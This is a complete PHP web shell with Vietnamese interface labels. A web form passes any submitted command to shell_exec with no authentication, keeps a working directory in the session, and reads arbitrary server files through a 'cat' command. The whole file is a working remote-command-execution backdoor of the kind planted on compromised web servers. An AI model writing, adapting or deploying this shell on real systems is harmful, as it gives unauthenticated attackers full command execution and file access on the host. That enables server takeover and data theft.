<?php
session_start();

if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

$output = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $command = $_POST['cmd'];

    if (strpos($command, 'cd ') === 0) {
        $dir = substr($command, 3);
        if ($dir === '..') {
            $_SESSION['current_dir'] = dirname($_SESSION['current_dir']);
        } else {
            $new_dir = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $dir);
            if (is_dir($new_dir)) {
                $_SESSION['current_dir'] = $new_dir;
            } else {
                $output = "Thư mục không tồn tại: $dir";
            }
        }
    } elseif (strpos($command, 'cat ') === 0) {
        $file = substr($command, 4);
        $file_path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $file);
        if (is_file($file_path)) {
            $output = htmlspecialchars(file_get_contents($file_path));
        } else {
            $output = "File không tồn tại: $file";
        }
    } else {
        $output = shell_exec("cd " . escapeshellarg($_SESSION['current_dir']) . " && " . $command);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
</head>
<body>
<h1>PHP Web Shell</h1>
<form method="POST">
    <label for="cmd">Nhập lệnh:</label>
    <input type="text" id="cmd" name="cmd" required>
    <button type="submit">Thực thi</button>
</form>
<pre>
    <?php
    echo "Thư mục hiện tại: " . $_SESSION['current_dir'] . "\n\n";
    echo $output;
    ?>
    </pre>
</body>
</html>